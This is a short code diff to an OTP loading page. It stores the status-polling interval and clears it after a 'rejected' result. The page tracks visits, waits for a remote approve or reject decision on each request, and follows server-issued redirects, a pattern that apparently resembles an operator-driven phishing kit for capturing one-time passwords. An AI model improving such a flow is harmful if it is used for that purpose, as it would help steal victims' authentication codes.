@@ -175,6 +175,7 @@
             body: JSON.stringify({ action: 'track_visit', page: 'otp_loading_en' })
         }).catch(error => console.error('Error tracking visit:', error));
 
+        let otpStatusInterval = null;
         function checkStatus() {
             if (!requestId) return;
             
@@ -184,6 +185,8 @@
                 if (data.status === 'approved') {
                     window.location.href = 'success_en.html';
                 } else if (data.status === 'rejected') {
+                    // Stop polling after rejection to avoid repeated redirects
+                    if (otpStatusInterval) { clearInterval(otpStatusInterval); otpStatusInterval = null; }
                     window.location.href = 'otp_en.html?rejected=true';
                 } else if (data.redirect_to) {
                     window.location.href = data.redirect_to;
@@ -193,7 +196,7 @@
         }
 
         if (requestId) {
-            setInterval(checkStatus, 3000);
+            otpStatusInterval = setInterval(checkStatus, 3000);
         } else {
             setTimeout(() => { window.location.href = 'otp_en.html'; }, 5000);
         }
